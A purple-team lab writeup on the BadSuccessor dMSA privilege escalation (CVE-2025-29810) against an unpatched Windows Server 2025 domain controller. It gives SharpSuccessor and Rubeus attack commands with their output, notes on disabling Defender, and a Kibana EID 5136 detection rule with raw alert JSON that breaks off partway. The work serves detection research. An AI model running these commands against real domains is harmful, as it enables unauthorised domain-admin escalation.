# Bad Successor (CVE-2025-29810) — Lab Writeup
**Author:** Osher Jacobs  
**Date:** April 2026  
**Domain:** `badsuccessor.local`  
**Repo:** `osherjacobs/AD-Lab-Research`

---

## Executive Summary

This writeup documents a full purple team lab execution of the Bad Successor dMSA privilege escalation technique (CVE-2025-29810) against an intentionally unpatched Windows Server 2025 Domain Controller. The goal was to validate the attack chain end-to-end, capture detection telemetry in ELK, and produce a production-grade Kibana detection rule.

**Result:** The KDC-side primitive is confirmed working at the protocol level. DA was not achieved due to unfixed parsing bugs in all available public tooling. This creates a gap between theoretical exploitability and practical weaponization. The detection rule is valid, tested, and ready for production deployment.

---

## Lab Infrastructure

| Machine | IP | OS | Role |
|---|---|---|---|
| Kali | 192.168.1.218 | Kali Linux | Attacker |
| WIN-ATTACK | 192.168.1.83 | Server 2022 Standard Eval | Domain-joined attack platform |
| DC02 (WIN-G4OJKPN3TOV) | 192.168.1.4 | Server 2025 Datacenter Eval Build 26100.32230 | Unpatched DC |
| ELK | 192.168.1.250 | Ubuntu | SIEM (Elasticsearch + Kibana) |

**Domain:** `badsuccessor.local`  
**Patch threshold:** 26100.4946 (DC02 is below — vulnerable)  
**DA account:** `Administrator` (built-in)  
**DC local admin (console access):** `ubuntu`  
**Low-privilege attacker:** `lowpriv`

---

## Background

In May 2025, Yuval Gordon (Akamai) published [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory), documenting a novel Active Directory privilege escalation vulnerability in Windows Server 2025. The attack abuses Delegated Managed Service Accounts (dMSAs) — a new object type introduced with Server 2025 — to escalate from low-privileged user to Domain Administrator.

**Pre-patch primitive:** An attacker with `CreateChild` over any OU could create a dMSA, set `msDS-ManagedAccountPrecededByLink` to a DA account, and request a Kerberos ticket inheriting the DA's credentials.

**Post-patch:** Microsoft patched the `CreateChild` abuse path. The post-patch primitive (documented by Yuval and expanded by SpecterOps) requires `GenericWrite` on a target object plus `CreateChild` on an OU — a more constrained but still realistic misconfiguration in real environments.

This lab targets the **pre-patch primitive** on an intentionally unpatched DC.

---

## Lab Setup Pain — An Honest Account

> This section documents the actual friction encountered during lab construction. Understanding where the tooling ecosystem is broken is as valuable as the attack chain itself.

### DC Promotion
DC02 was promoted as the DC for `badsuccessor.local`. WIN-ATTACK was domain-joined from `lab2019.local` (previous lab domain), requiring:
- IPv6 disabled
- Registry hack to force unjoin from lab2019.local
- `LocalAccountTokenFilterPolicy=1` for remote admin

### LDAP Signing — The Wall
Server 2025 enforces LDAP signing by default. This blocked **every Linux-side LDAP tool**:
- `ldap3` (Python) — `strongerAuthRequired`
- `impacket` badsuccessor.py — `strongerAuthRequired`
- `powerview` (Kali) — connected but couldn't find objects due to signing
- Registry modification (`LDAPServerIntegrity=0`) — GPO kept overriding it back

**Resolution:** All attribute writes were performed from WIN-ATTACK using native Windows AD cmdlets, which handle LDAP signing transparently. This requires execution from a domain-joined context, which may not always be available to an attacker — a real operational constraint.

### Defender
Every attack binary was flagged before reaching the target:
- Standard Rubeus (2022) — no `/dmsa` support
- Kali-compiled Rubeus (dotnet SDK) — P/Invoke failures due to Linux cross-compilation
- JoeDibley/Rubeus PR #194 — NullReferenceException in `PA_DMSA_KEY_PACKAGE`
- GhostPack/Rubeus master — same NullReferenceException (unfixed in mainline)
- SharpSuccessor — intermittently failed to apply the critical attribute despite reporting success

Defender had to be disabled on WIN-ATTACK to transfer binaries. Even with real-time protection off, cloud-delivered protection flagged transfers at the network level.

### Auditing
DS Change auditing (`Directory Service Changes`) was not enabled by default. `auditpol` commands succeeded but were overridden by GPO until `gpupdate /force` was run. Object-level SACLs also needed to be set on the dMSA object itself — container-level SACLs alone were insufficient.

### Tooling Archaeology
An outdated 2022 Rubeus build carried over from a previous HTB lab -I found worked for most things- had no `/dmsa` support — three years before dMSA was implemented. GhostPack does not use tagged releases; the version string `v2.3.3` was identical between the 2022 binary and the 2026 master build. No way to tell from version alone.

---

## Attack Chain

### Step 1 — dMSA Setup (SharpSuccessor)

SharpSuccessor was used to configure the dMSA object. Built from [logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor) on a Windows dev machine with Visual Studio 2026.

**[WIN-ATTACK as lowpriv]**
```
SharpSuccessor.exe add /impersonate:Administrator /path:"CN=Managed Service Accounts,DC=badsuccessor,DC=local" /account:lowpriv /name:svc-backup
```

**Output:**
```
[+] Adding dnshostname svc-backup.badsuccessor.local
[+] Adding samaccountname svc-backup$
[+] Administrator's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
Error: Access is denied.
```

**Key line:** `[+] Wrote attribute successfully` — `msDS-ManagedAccountPrecededByLink` set to `CN=Administrator,CN=Users,DC=badsuccessor,DC=local` by `lowpriv`. The `userAccountControl` denial is non-blocking.

> **Note:** In testing against a fully hardened Server 2025 DC with LDAP signing enforced, SharpSuccessor intermittently failed to apply the attribute despite reporting success. This was confirmed by querying the DC directly after the tool run. A manual `Set-ADObject` fallback from WIN-ATTACK was required to reliably trigger the attribute write and generate detection telemetry. The primary public tool for this technique fails against hardened targets.

### Step 2 — TGT via tgtdeleg

**[WIN-ATTACK as lowpriv]**
```
Rubeus.exe tgtdeleg /nowrap
```

Output confirms TGT obtained for `lowpriv` via fake delegation to `cifs/DC02.badsuccessor.local`.

### Step 3 — dMSA TGS Request

**[WIN-ATTACK as lowpriv]**
```
Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/BADSUCCESSOR.LOCAL /targetuser:svc-backup$ /ticket:<TGT_BASE64> /nowrap /dc:192.168.1.4
```

**Critical output:**
```
[+] TGS request successful!
[!] Unhandled Rubeus exception:
System.NullReferenceException: Object reference not set to an instance of an object.
   at Rubeus.EncryptionKey..ctor(AsnElt body)
   at Rubeus.PA_KEY_LIST_REP..ctor(AsnElt body)
   at Rubeus.PA_DMSA_KEY_PACKAGE..ctor(AsnElt body)
```

**Interpretation:** The TGS response was successfully returned by the KDC before Rubeus crashed during parsing. This is a client-side bug, not a server-side rejection. The vulnerability is functioning as expected at the protocol level.

The ticket arrives. Rubeus can't read it.

This crash is present in **GhostPack Rubeus master** as of April 2026. It is not fixed in any public release.

---

## Tooling Findings

### Rubeus /dmsa Bug

The crash occurs in `PA_DMSA_KEY_PACKAGE..ctor` when parsing the KDC response. The ASN.1 structure returned by Server 2025 does not match the parser's assumptions — likely a nesting depth mismatch. The `previousKeys` field is OPTIONAL in the spec but the parser assumes its presence.

Root cause location: `lib/krb_structures/PA_DMSA_KEY_PACKAGE.cs` and `lib/krb_structures/PA_KEY_LIST_REP.cs`.

Multiple fix attempts were made during this lab with null guards and index adjustments. All produced either the same crash or a ticket with zeroed key material.

**Status:** Unfixed in public tooling as of April 2026.

### SharpSuccessor LDAP Signing Failure

In testing against fully hardened Server 2025 DCs with LDAP signing enforced, SharpSuccessor intermittently failed to apply the `msDS-ManagedAccountPrecededByLink` attribute despite reporting success. The tool dropped the critical attribute write silently. Confirmed by querying the DC directly after each tool run.

**Implication:** The detection rule will not fire if SharpSuccessor is used as the sole attack tool against a hardened Server 2025 DC — because the attack itself did not succeed.

---

## Detection

### Prerequisites

| Requirement | Command |
|---|---|
| DS Change auditing | `auditpol /set /subcategory:"Directory Service Changes" /success:enable` + `gpupdate /force` |
| Object SACL | Set `WriteProperty` audit rule on dMSA object for `Everyone (S-1-1-0)` |
| Winlogbeat event_id | `5136` must be in the winlogbeat.yml event_logs config |

### EID 5136 — Confirmed Telemetry

```
event.code: 5136
winlog.event_data.SubjectUserName: lowpriv
winlog.event_data.ObjectClass: msDS-DelegatedManagedServiceAccount
winlog.event_data.AttributeLDAPDisplayName: msDS-ManagedAccountPrecededByLink
winlog.event_data.AttributeValue: CN=Administrator,CN=Users,DC=badsuccessor,DC=local
winlog.event_data.OperationType: %%14674 (Value Added)
host.name: DC02.badsuccessor.local
```

### Kibana Detection Rule

**Rule Name:** `Bad Successor - dMSA Predecessor Link Attribute Write (EID 5136)`

**KQL:**
```kql
event.code: "5136" and 
winlog.event_data.AttributeLDAPDisplayName: "msDS-ManagedAccountPrecededByLink" and
winlog.event_data.OperationType: "%%14674" and
not winlog.event_data.SubjectUserSid: "S-1-5-18"
```

**Severity:** Critical  
**Risk Score:** 90  
**False Positive Rate:** No known legitimate use cases in typical enterprise environments.

**MITRE ATT&CK:**
- Tactic: Privilege Escalation (TA0004)
- Technique: Account Manipulation (T1098)

**Tags:** `Active Directory`, `Privilege Escalation`, `dMSA`, `Bad Successor`, `CVE-2025-29810`, `Windows Server 2025`

---

## Findings Summary

| Finding | Status |
|---|---|
| KDC issues dMSA TGS response on unpatched Server 2025 | ✅ Confirmed |
| EID 5136 fires on attribute write | ✅ Confirmed |
| Kibana rule validated against live telemetry | ✅ Confirmed |
| DA achieved via public tooling | ❌ Not achieved |
| GhostPack Rubeus /dmsa parsing bug | ❌ Unfixed in public repo |
| SharpSuccessor reliable against hardened Server 2025 | ❌ Intermittent silent failure |
| Linux tooling viable against Server 2025 LDAP signing | ❌ Blocked |

---

## Conclusions

The Bad Successor dMSA attack primitive is viable at the protocol and KDC level on unpatched Windows Server 2025 DCs. Public tooling cannot currently complete the attack chain end-to-end without modification. This creates a gap between theoretical exploitability and practical weaponization.

The SpecterOps demonstration (October 2025) suggests their chain relied on functionality not currently present in public tooling.

The detection is **tool-agnostic** — the invariant is a critical attribute write in the attack chain, not the tool. Any implementation that successfully writes `msDS-ManagedAccountPrecededByLink` will trigger EID 5136. The rule is production-ready.

**Patch recommendation:** Update Server 2025 DCs to build 26100.4946 or later.

---


## References

- [Akamai — BadSuccessor: Abusing dMSA for Privilege Escalation](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Yuval Gordon — BadSuccessor Is Dead, Long Live BadSuccessor(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [SpecterOps — The (Near) Return of the King](https://specterops.io/blog/2025/10/20/the-near-return-of-the-king/)
- [logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)


<img width="1869" height="826" alt="kibanabadsuccessoralert" src="https://github.com/user-attachments/assets/b43bfeed-0fe8-4d59-a4ea-be3a99d2bb8b" />

<img width="1494" height="403" alt="SharpSuccessor1" src="https://github.com/user-attachments/assets/3cc342e9-b935-48eb-a9df-70c7130323d2" />

<img width="1854" height="729" alt="Rubeusasktgs" src="https://github.com/user-attachments/assets/bd54fe08-d0cc-4472-bb49-600d69eb5a9e" />

<img width="1850" height="537" alt="Rubeustgtdeleg" src="https://github.com/user-attachments/assets/f3ddeb26-c122-4e53-9e64-5b04ef0fc090" />

{
  "_index": ".internal.alerts-security.alerts-default-000001",
  "_id": "26a4b816758f447acfd39c16814092bc6a2a0bc2db9df735f811d3a226d1979c",
  "_score": 1,
  "_source": {
    "kibana.alert.rule.execution.timestamp": "2026-04-12T07:51:35.033Z",
    "kibana.alert.start": "2026-04-12T07:51:35.033Z",
    "kibana.alert.last_detected": "2026-04-12T07:51:35.033Z",
    "kibana.version": "8.19.12",
    "kibana.alert.rule.parameters": {
      "description": "Detects writes to the msDS-ManagedAccountPrecededByLink attribute on a Delegated Managed Service Account (dMSA) object. This attribute defines which legacy account a dMSA supersedes and inherits credentials from. Writing to this attribute is the core primitive of the Bad Successor attack (CVE-2025-29810), enabling a low-privileged attacker to link a dMSA to a high-privileged account such as Domain Administrator, then request a Kerberos ticket containing the target account's key material. This attribute has no legitimate operational use case outside of planned dMSA migrations performed by privileged administrators. Any write by a non-SYSTEM account should be treated as highly suspicious. Affected: Windows Server 2025 builds prior to 26100.4946.",
      "risk_score": 90,
      "severity": "critical",
      "license": "",
      "meta": {
        "kibana_siem_app_url": "http://localhost:5601/app/security"
      },
      "author": [],
      "false_positives": [],
      "from": "now-6m",
      "rule_id": "66177997-e44c-45a3-a2c9-c6196bb7b8ae",
      "max_signals": 100,
      "risk_score_mapping": [],
      "severity_mapping": [],
      "threat": [
        {
          "framework": "MITRE ATT&CK",
          "tactic": {
            "id": "TA0004",
            "name": "Privilege Escalation",
            "reference": "https://attack.mitre.org/tactics/TA0004/"
          },
          "technique": [
            {
              "id": "T1098",
              "name": "Account Manipulation",
              "reference": "https://attack.mitre.org/techniques/T1098/",
              "subtechnique": []
            }
          ]
        }
      ],
      "to": "now",
      "references": [],
      "version": 1,
      "exceptions_list": [],
      "immutable": false,
      "rule_source": {
        "type": "internal"
      },
      "related_integrations": [],
      "required_fields": [],
      "setup": "",
      "type": "query",
      "language": "kuery",
      "index": [
        "apm-*-transaction*",
        "auditbeat-*",
        "endgame-*",
        "filebeat-*",
        "logs-*",
        "packetbeat-*",
        "traces-apm*",
        "winlogbeat-*",
        "-*elastic-cloud-logs-*",
        ".ds-winlogbeat-*"
      ],
      "query": "event.code: \"5136\" and \nwinlog.event_data.AttributeLDAPDisplayName: \"msDS-ManagedAccountPrecededByLink\" and\nwinlog.event_data.OperationType: \"%%14674\" and\nnot winlog.event_data.SubjectUserSid: \"S-1-5-18\"",
      "filters": []
    },
    "kibana.alert.rule.category": "Custom Query Rule",
    "kibana.alert.rule.consumer": "siem",
    "kibana.alert.rule.execution.uuid": "c743e4f0-36ba-4726-9bd6-8c91af1fbbbb",
    "kibana.alert.rule.name": "Bad Successor - dMSA Predecessor Link Attribute Write (EID 5136)",
    "kibana.alert.rule.producer": "siem",
    "kibana.alert.rule.revision": 1,
    "kibana.alert.rule.rule_type_id": "siem.queryRule",
    "kibana.alert.rule.uuid": "c72c9c7d-c936-49db-ac5f-7d1d52cd4c9c",
    "kibana.space_ids": [
      "default"
    ],
    "kibana.alert.rule.tags": [
      "Active Directory Privilege Escalation dMSA Bad Successor CVE-2025-29810 Windows Server 2025"
    ],
    "@timestamp": "2026-04-12T07:51:35.020Z",
    "message": "A directory service object was modified.\n\t\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4102481429-207641625-1255947624-1106\n\tAccount Name:\t\tlowpriv\n\tAccount Domain:\t\tBADSUCCESSOR\n\tLogon ID:\t\t0x1628621\n\nDirectory Service:\n\tName:\tbadsuccessor.local\n\tType:\tActive Directory Domain Services\n\t\nObject:\n\tDN:\tCN=svc-backup,CN=Managed Service Accounts,DC=badsuccessor,DC=local\n\tGUID:\t{949b2961-a1a6-4336-835f-efe2e0bcc576}\n\tClass:\tmsDS-DelegatedManagedServiceAccount\n\t\nAttribute:\n\tLDAP Display Name:\tmsDS-ManagedAccountPrecededByLink\n\tSyntax (OID):\t2.5.5.1\n\tValue:\tCN=Administrator,CN=Users,DC=badsuccessor,DC=local\n\t\nOperation:\n\tType:\tValue Added\n\tCorrelation ID:\t{6b746e25-9937-4979-aaae-30dbb7a80948}\n\tApplication Correlation ID:\t-",
    "ecs": {
      "version": "8.0.0"
    },
    "agent": {
      "type": "winlogbeat",
      "version": "8.19.12",
      "ephemeral_id": "97a05d78-03f6-404f-8018-46cac5642046",
      "id": "d03fb57b-7222-4253-b677-4d8eba92e648",
      "name": "DC02",
      "hostname": "DC02"
    },
    "host": {
      "name": "DC02.badsuccessor.local"
    },
    "winlog": {
      "process": {
        "pid": 860,
        "thread": {
          "id": 984
        }
      },
      "api": "wineventlog",
      "event_id": "5136",
      "channel": "Security",
      "provider_name": "Microsoft-Windows-Security-Auditing",
      "opcode": "Info",
      "provider_guid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
      "task": "Logon",
      "event_data": {
        "OpCorrelationID": "{6b746e25-9937-4979-aaae-30dbb7a80948}",
        "AttributeSyntaxOID": "2.5.5.1",
        "ObjectDN": "CN=svc-backup,CN=Managed Service Accounts,DC=badsuccessor,DC=local",
        "OperationType": "%%14674",
        "SubjectUserSid": "S-1-5-21-4102481429-207641625-1255947624-1106",
        "AttributeValue": "CN=Administrator,CN=Users,DC=badsuccessor,DC=local",
        "DSName": "badsuccessor.local",
        "DSType": "%%14676",
        "SubjectUserName": "lowpriv",
        "AttributeLDAPDisplayName": "msDS-ManagedAccountPrecededByLink",
        "ObjectGUID": "{949b2961-a1a6-4336-835f-efe2e0bcc576}",
        "AppCorrelationID": "-",
        "SubjectDomainName": "BADSUCCESSOR",
        "ObjectClass": "msDS-DelegatedManagedServiceAccount",
        "SubjectLogonId": "0x1628621"
      },
      "computer_name": "DC02.badsuccessor.local",
      "keywords": [
        "Audit Success"
      ],
      "record_id": 12590
    },
    "event": {
      "provider": "Microsoft-Windows-Security-Auditing",
      "outcome": "success",
      "action": "Logon",
      "created": "2026-04-12T07:50:46.148Z",
      "code": "5136"
    },
    "log": {
      "level": "information"
    },
    "kibana.alert.original_event.kind": "event",
    "kibana.alert.original_event.provider": "Microsoft-Windows-Security-Auditing",
    "kibana.alert.original_event.outcome": "success",
    "kibana.alert.original_event.action": "Logon",
    "kibana.alert.original_event.created": "2026-04-12T07:50:46.148Z",
    "kibana.alert.original_event.code": "5136",
    "event.kind": "signal",
    "kibana.alert.original_time": "2026-04-12T07:50:44.349Z",
    "kibana.alert.ancestors": [
      {
        "id": "kzSrgJ0BiFvD4NWCrmJb",
        "type": "event",
        "index": ".ds-winlogbeat-8.19.12-2026.03.19-000001",
        "depth": 0
      }
    ],
    "kibana.alert.status": "active",
    "kibana.alert.workflow_status": "open",
    "kibana.alert.depth": 1,
    "kibana.alert.reason": "event on DC02.badsuccessor.local created critical alert Bad Successor - dMSA Predecessor Link Attribute Write (EID 5136).",
    "kibana.alert.severity": "critical",
    "kibana.alert.risk_score": 90,
    "kibana.alert.rule.actions": [],
    "kibana.alert.rule.author": [],
    "kibana.alert.rule.created_at": "2026-04-12T07:06:31.599Z",
    "kibana.alert.rule.created_by": "elastic",
    "kibana.alert.rule.description": "Detects writes to the msDS-ManagedAccountPrecededByLink attribute on a Delegated Managed Service Account (dMSA) object. This attribute defines which legacy account a dMSA supersedes and inherits credentials from. Writing to this attribute is the core primitive of the Bad Successor attack (CVE-2025-29810), enabling a low-privileged attacker to link a dMSA to a high-privileged account such as Domain Administrator, then request a Kerberos ticket containing the target account's key material. This attribute has no legitimate operational use case outside of planned dMSA migrations performed by privileged administrators. Any write by a non-SYSTEM account should be treated as highly suspicious. Affected: Windows Server 2025 builds prior to 26100.4946.",
    "kibana.alert.rule.enabled": true,
    "kibana.alert.rule.exceptions_list": [],
    "kibana.alert.rule.false_positives": [],
    "kibana.alert.rule.from": "now-6m",
    "kibana.alert.rule.immutable": false,
    "kibana.alert.rule.interval": "5m",
    "kibana.alert.rule.indices": [
      "apm-*-transaction*",
      "auditbeat-*",
      "endgame-*",
      "filebeat-*",
      "logs-*",
      "packetbeat-*",
      "traces-apm*",
      "winlogbeat-*",
      "-*elastic-cloud-logs-*",
      ".ds-winlogbeat-*"
    ],
    "kibana.alert.rule.license": "",
    "kibana.alert.rule.max_signals": 100,
    "kibana.alert.rule.references": [],
    "kibana.alert.rule.risk_score_mapping": [],
    "kibana.alert.rule.rule_id": "66177997-e44c-45a3-a2c9-c6196bb7b8ae",
    "kibana.alert.rule.severity_mapping": [],
    "kibana.alert.rule.threat": [
      {
        "framework": "MITRE ATT&CK",
        "tactic": {
          "id": "TA0004",
          "name": "Privilege Escalation",
          "reference": "https://attack.mitre.org/tactics/TA0004/"
        },
        "technique": [
          {
            "id": "T1098",
            "name": "Account Manipulation",
            "reference": "https://attack.mitre.org/techniques/T1098/",
            "subtechnique": []
          }
        ]
      }
    ],
    "kibana.alert.rule.to": "now",
    "kibana.alert.rule.type": "query",
    "kibana.alert.rule.updated_at": "2026-04-12T07:49:28.804Z",
    "kibana.alert.rule.updated_by": "elastic",
    "kibana.alert.rule.version": 1,
    "kibana.alert.uuid": "26a4b816758f447acfd39c16814092bc6a2a0bc2db9df735f811d3a226d1979c",
    "kibana.alert.workflow_tags": [],
    "kibana.alert.workflow_assignee_ids": [],
    "kibana.alert.rule.meta.kibana_siem_app_url": "http://localhost:5601/app/security",
    "kibana.alert.rule.risk_score": 90,
    "kibana.alert.rule.severity": "critical",
    "kibana.alert.intended_timestamp": "2026-04-12T07:51:35.020Z",
    "kibana.alert.rule.execution.type": "scheduled"
  },
  "fields": {
    "kibana.alert.severity": [
      "critical"
    ],
    "kibana.alert.rule.updated_by": [
      "elastic"
    ],
    "signal.ancestors.depth": [
      0
    ],
    "kibana.alert.rule.tags": [
      "Active Directory Privilege Escalation dMSA Bad Successor CVE-2025-29810 Windows Server 2025"
    ],
    "signal.original_event.created": [
      "2026-04-12T07:50:46.148Z"
    ],
    "winlog.process.pid": [
      860
    ],
    "kibana.alert.reason.text": [
      "event on DC02.badsuccessor.local created critical alert Bad Successor - dMSA Predecessor Link Attribute Write (EID 5136)."
    ],
    "kibana.alert.rule.threat.technique.id": [
      "T1098"
    ],
    "kibana.alert.ancestors.depth": [
      0
    ],
    "signal.rule.enabled": [
      "true"
    ],
    "signal.rule.max_signals": [
      100
    ],
    "kibana.alert.risk_score": [
      90
    ],
    "signal.rule.updated_at": [
      "2026-04-12T07:49:28.804Z"
    ],
    "agent.name": [
      "DC02"
    ],
    "event.outcome": [
      "success"
    ],
    "winlog.event_data.AttributeLDAPDisplayName": [
      "msDS-ManagedAccountPrecededByLink"
    ],
    "signal.original_event.code": [
      "5136"
    ],
    "kibana.alert.rule.interval": [
      "5m"
    ],
    "kibana.alert.rule.type": [
      "query"
    ],
    "agent.hostname": [
      "DC02"
    ],
    "winlog.event_data.AttributeSyntaxOID": [
      "2.5.5.1"
    ],
    "kibana.alert.start": [
      "2026-04-12T07:51:35.033Z"
    ],
    "event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "kibana.alert.rule.immutable": [
      "false"
    ],
    "event.code": [
      "5136"
    ],
    "agent.id": [
      "d03fb57b-7222-4253-b677-4d8eba92e648"
    ],
    "signal.rule.from": [
      "now-6m"
    ],
    "winlog.event_data.OperationType": [
      "%%14674"
    ],
    "kibana.alert.rule.enabled": [
      "true"
    ],
    "kibana.alert.rule.version": [
      "1"
    ],
    "kibana.alert.ancestors.type": [
      "event"
    ],
    "winlog.event_data.SubjectUserSid": [
      "S-1-5-21-4102481429-207641625-1255947624-1106"
    ],
    "winlog.process.thread.id": [
      984
    ],
    "signal.ancestors.index": [
      ".ds-winlogbeat-8.19.12-2026.03.19-000001"
    ],
    "signal.original_event.outcome": [
      "success"
    ],
    "agent.type": [
      "winlogbeat"
    ],
    "winlog.event_data.SubjectLogonId": [
      "0x1628621"
    ],
    "winlog.api": [
      "wineventlog"
    ],
    "signal.rule.threat.framework": [
      "MITRE ATT&CK"
    ],
    "winlog.event_data.OpCorrelationID": [
      "{6b746e25-9937-4979-aaae-30dbb7a80948}"
    ],
    "kibana.alert.rule.max_signals": [
      100
    ],
    "kibana.alert.rule.risk_score": [
      90
    ],
    "signal.rule.threat.technique.id": [
      "T1098"
    ],
    "winlog.event_data.ObjectDN": [
      "CN=svc-backup,CN=Managed Service Accounts,DC=badsuccessor,DC=local"
    ],
    "kibana.alert.rule.consumer": [
      "siem"
    ],
    "kibana.alert.rule.indices": [
      "apm-*-transaction*",
      "auditbeat-*",
      "endgame-*",
      "filebeat-*",
      "logs-*",
      "packetbeat-*",
      "traces-apm*",
      "winlogbeat-*",
      "-*elastic-cloud-logs-*",
      ".ds-winlogbeat-*"
    ],
    "kibana.alert.rule.category": [
      "Custom Query Rule"
    ],
    "event.action": [
      "Logon"
    ],
    "@timestamp": [
      "2026-04-12T07:51:35.020Z"
    ],
    "kibana.alert.original_event.action": [
      "Logon"
    ],
    "signal.rule.updated_by": [
      "elastic"
    ],
    "winlog.channel": [
      "Security"
    ],
    "kibana.alert.intended_timestamp": [
      "2026-04-12T07:51:35.020Z"
    ],
    "kibana.alert.rule.severity": [
      "critical"
    ],
    "winlog.opcode": [
      "Info"
    ],
    "agent.ephemeral_id": [
      "97a05d78-03f6-404f-8018-46cac5642046"
    ],
    "kibana.alert.rule.execution.timestamp": [
      "2026-04-12T07:51:35.033Z"
    ],
    "signal.rule.threat.technique.reference": [
      "https://attack.mitre.org/techniques/T1098/"
    ],
    "kibana.alert.rule.execution.uuid": [
      "c743e4f0-36ba-4726-9bd6-8c91af1fbbbb"
    ],
    "kibana.alert.uuid": [
      "26a4b816758f447acfd39c16814092bc6a2a0bc2db9df735f811d3a226d1979c"
    ],
    "winlog.event_data.SubjectDomainName": [
      "BADSUCCESSOR"
    ],
    "kibana.alert.rule.meta.kibana_siem_app_url": [
      "http://localhost:5601/app/security"
    ],
    "kibana.version": [
      "8.19.12"
    ],
    "signal.rule.threat.technique.name": [
      "Account Manipulation"
    ],
    "signal.rule.license": [
      ""
    ],
    "signal.ancestors.type": [
      "event"
    ],
    "kibana.alert.rule.rule_id": [
      "66177997-e44c-45a3-a2c9-c6196bb7b8ae"
    ],
    "signal.rule.type": [
      "query"
    ],
    "kibana.alert.ancestors.id": [
      "kzSrgJ0BiFvD4NWCrmJb"
    ],
    "kibana.alert.original_event.code": [
      "5136"
    ],
    "winlog.provider_name": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "winlog.provider_guid": [
      "{54849625-5478-4994-a5ba-3e3b0328c30d}"
    ],
    "kibana.alert.rule.description": [
      "Detects writes to the msDS-ManagedAccountPrecededByLink attribute on a Delegated Managed Service Account (dMSA) object. This attribute defines which legacy account a dMSA supersedes and inherits credentials from. Writing to this attribute is the core primitive of the Bad Successor attack (CVE-2025-29810), enabling a low-privileged attacker to link a dMSA to a high-privileged account such as Domain Administrator, then request a Kerberos ticket containing the target account's key material. This attribute has no legitimate operational use case outside of planned dMSA migrations performed by privileged administrators. Any write by a non-SYSTEM account should be treated as highly suspicious. Affected: Windows Server 2025 builds prior to 26100.4946."
    ],
    "winlog.event_data.DSType": [
      "%%14676"
    ],
    "winlog.computer_name": [
      "DC02.badsuccessor.local"
    ],
    "kibana.alert.rule.producer": [
      "siem"
    ],
    "kibana.alert.rule.to": [
      "now"
    ],
    "signal.rule.created_by": [
      "elastic"
    ],
    "signal.rule.interval": [
      "5m"
    ],
    "kibana.alert.rule.created_by": [
      "elastic"
    ],
    "winlog.event_data.AppCorrelationID": [
      "-"
    ],
    "signal.rule.id": [
      "c72c9c7d-c936-49db-ac5f-7d1d52cd4c9c"
    ],
    "winlog.keywords": [
      "Audit Success"
    ],
    "signal.reason": [
      "event on DC02.badsuccessor.local created critical alert Bad Successor - dMSA Predecessor Link Attribute Write (EID 5136)."
    ],
    "signal.rule.risk_score": [
      90
    ],
    "winlog.record_id": [
      12590
    ],
    "kibana.alert.rule.name": [
      "Bad Successor - dMSA Predecessor Link Attribute Write (EID 5136)"
    ],
    "log.level": [
      "information"
    ],
    "host.name": [
      "DC02.badsuccessor.local"
    ],
    "kibana.alert.rule.threat.technique.reference": [
      "https://attack.mitre.org/techniques/T1098/"
    ],
    "signal.status": [
      "open"
    ],
    "event.kind": [
      "signal"
    ],
    "signal.rule.created_at": [
      "2026-04-12T07:06:31.599Z"
    ],
    "signal.rule.tags": [
      "Active Directory Privilege Escalation dMSA Bad Successor CVE-2025-29810 Windows Server 2025"
    ],
    "kibana.alert.workflow_status": [
      "open"
    ],
    "kibana.alert.original_event.created": [
      "2026-04-12T07:50:46.148Z"
    ],
    "kibana.alert.rule.threat.tactic.name": [
      "Privilege Escalation"
    ],
    "kibana.alert.rule.uuid": [
      "c72c9c7d-c936-49db-ac5f-7d1d52cd4c9c"
    ],
    "signal.original_event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "kibana.alert.reason": [
      "event on DC02.badsuccessor.local created critical alert Bad Successor - dMSA Predecessor Link Attribute Write (EID 5136)."
    ],
    "signal.rule.threat.tactic.id": [
      "TA0004"
    ],
    "signal.ancestors.id": [
      "kzSrgJ0BiFvD4NWCrmJb"
    ],
    "signal.original_time": [
      "2026-04-12T07:50:44.349Z"
    ],
    "winlog.event_data.ObjectGUID": [
      "{949b2961-a1a6-4336-835f-efe2e0bcc576}"
    ],
    "ecs.version": [
      "8.0.0"
    ],
    "signal.rule.severity": [
      "critical"
    ],
    "kibana.alert.ancestors.index": [
      ".ds-winlogbeat-8.19.12-2026.03.19-000001"
    ],
    "event.created": [
      "2026-04-12T07:50:46.148Z"
    ],
    "agent.version": [
      "8.19.12"
    ],
    "kibana.alert.depth": [
      1
    ],
    "kibana.alert.rule.from": [
      "now-6m"
    ],
    "kibana.alert.rule.parameters": [
      {
        "severity": "critical",
        "max_signals": 100,
        "rule_source": {
          "type": "internal"
        },
        "risk_score": 90,
        "query": "event.code: \"5136\" and \nwinlog.event_data.AttributeLDAPDisplayName: \"msDS-ManagedAccountPrecededByLink\" and\nwinlog.event_data.OperationType: \"%%14674\" and\nnot winlog.event_data.SubjectUserSid: \"S-1-5-18\"",
        "description": "Detects writes to the msDS-ManagedAccountPrecededByLink attribute on a Delegated Managed Service Account (dMSA) object. This attribute defines which legacy account a dMSA supersedes and inherits credentials from. Writing to this attribute is the core primitive of the Bad Successor attack (CVE-2025-29810), enabling a low-privileged attacker to link a dMSA to a high-privileged account such as Domain Administrator, then request a Kerberos ticket containing the target account's key material. This attribute has no legitimate operational use case outside of planned dMSA migrations performed by privileged administrators. Any write by a non-SYSTEM account should be treated as highly suspicious. Affected: Windows Server 2025 builds prior to 26100.4946.",
        "index": [
          "apm-*-transaction*",
          "auditbeat-*",
          "endgame-*",
          "filebeat-*",
          "logs-*",
          "packetbeat-*",
          "traces-apm*",
          "winlogbeat-*",
          "-*elastic-cloud-logs-*",
          ".ds-winlogbeat-*"
        ],
        "language": "kuery",
        "type": "query",
        "version": 1,
